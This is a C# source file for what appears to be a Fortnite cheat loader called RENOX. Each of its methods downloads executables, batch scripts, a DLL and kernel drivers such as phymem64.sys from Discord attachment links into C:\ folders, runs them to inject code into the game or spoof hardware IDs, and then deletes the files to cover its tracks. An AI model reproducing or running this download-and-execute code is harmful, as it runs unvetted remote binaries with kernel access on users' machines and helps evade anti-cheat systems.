using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.IO;

namespace RENOX
{
    class Cheats
    {
        public static void Drive()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            WebClient webClient = new WebClient();
            Directory.CreateDirectory("C:\\Driver\\");
            string text = "C:\\Driver\\RenoxDrv.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787033231047524352/788374763742822430/RenoxDrv.exe", text);
            Process.Start(text);
            Process process = new Process();
            Console.ReadLine();
            File.Delete(text);
        }
        public static void InverseSpoofer()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            WebClient webClient = new WebClient();
            Directory.CreateDirectory("C:\\Spoofer\\");
            string text = "C:\\Spoofer\\Inverse_Spoofer_Updated_Release.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/790159853338492958/799336307544817664/Inverse_Spoofer_Updated_Release.exe", text);
            Process.Start(text);
            Process process = new Process();
            Console.ReadLine();
            File.Delete(text);
        }
        public static void pmodmap()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            WebClient webClient = new WebClient();
            Directory.CreateDirectory("C:\\peakedmodmap\\");
            string text2 = "C:\\peakedmodmap\\Inject.bat";
            string text4 = "C:\\peakedmodmap\\audiomap.exe";
            string text5 = "C:\\peakedmodmap\\Peaked.dll";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787363349062484018/807749365317500948/inject.bat", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787363349062484018/806851111717044254/audiomap.exe", text4);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787363349062484018/807746199121428510/Peaked.dll", text5);
            Process process = new Process();
            Thread.Sleep(3000);
            process.Close();
            Console.Clear();
            Thread.Sleep(1000);
            Console.Clear();
            Class2.Print("\n [+] Open Fortnite");
            Class2.Print("\n [+] Press Enter In Lobby");
            Console.ReadLine();
            Process.Start(text2);
            Thread.Sleep(2000);
            Console.Clear();
            File.Delete(text2);
            File.Delete(text4);
            File.Delete(text5);
        }
        public static void pmodmap2()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            WebClient webClient = new WebClient();
            Directory.CreateDirectory("C:\\peakedmodmap2\\");
            string text2 = "C:\\peakedmodmap2\\Inject.bat";
            string text4 = "C:\\peakedmodmap2\\audiomap.exe";
            string text5 = "C:\\peakedmodmap2\\Peaked.dll";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787363349062484018/807750228543406102/inject.bat", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787363349062484018/806851111717044254/audiomap.exe", text4);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787363349062484018/807746199121428510/Peaked.dll", text5);
            Process process = new Process();
            Thread.Sleep(3000);
            process.Close();
            Console.Clear();
            Thread.Sleep(1000);
            Console.Clear();
            Class2.Print("\n [+] Open Fortnite");
            Class2.Print("\n [+] Press Enter In Lobby");
            Console.ReadLine();
            Process.Start(text2);
            Thread.Sleep(2000);
            Console.Clear();
            File.Delete(text2);
            File.Delete(text4);
            File.Delete(text5);
        }
        public static void prflog()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            WebClient webClient = new WebClient();
            Directory.CreateDirectory("C:\\Driver2\\");
            string text = "C:\\Driver2\\prflog.bat";
            string text3 = "C:\\Driver2\\prflog_cfg.exe";
            string text6 = "C:\\Driver2\\Driver.sys";
            string text7 = "C:\\Driver2\\prflog64.sys";
            string text8 = "C:\\Driver2\\phymem64.sys";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787363349062484018/807751775611519016/prflog.bat", text);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034479849209866/prflog_cfg.exe", text3);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034475654381588/Driver.sys", text6);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034480079241216/prflog64.sys", text7);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034476740444160/phymem64.sys", text8);
            Process process = new Process();
            Thread.Sleep(3000);
            Process.Start(text);
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.White;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.White;
            Thread.Sleep(6000);
            Console.Clear();
            Thread.Sleep(4000);
            Console.Clear();
            File.Delete(text);
            File.Delete(text3);
            File.Delete(text6);
            File.Delete(text7);
            File.Delete(text8);
        }

        public static void psmap()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            WebClient webClient = new WebClient();
            Directory.CreateDirectory("C:\\peakedsmap\\");
            string text2 = "C:\\peakedsmap\\smap.bat";
            string text4 = "C:\\peakedsmap\\smap.exe";
            string text5 = "C:\\peakedsmap\\Peaked.dll";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787363349062484018/807751481901973504/smap.bat", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034487558078464/smap.exe", text4);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787363349062484018/807746199121428510/Peaked.dll", text5);
            Process process = new Process();
            Thread.Sleep(3000);
            process.Close();
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Red;
            Class2.Print("\n [+] Open Fortnite");
            Class2.Print("\n [+] Press Enter In Lobby");
            Console.ReadLine();
            Process.Start(text2);
            Thread.Sleep(4000);
            Console.Clear();
            File.Delete(text2);
            File.Delete(text4);
            File.Delete(text5);
        }

        public static void AppleCleaner()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            WebClient webClient = new WebClient();
            Directory.CreateDirectory("C:\\Cleaner\\");
            string text = "C:\\Cleaner\\cleanerBETAS5.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/787033231047524352/789862712053071872/cleanerBETAS5.exe", text);
            Process process = new Process();
            Process.Start(text);
            Console.ReadLine();
            File.Delete(text);
        }

    }
}
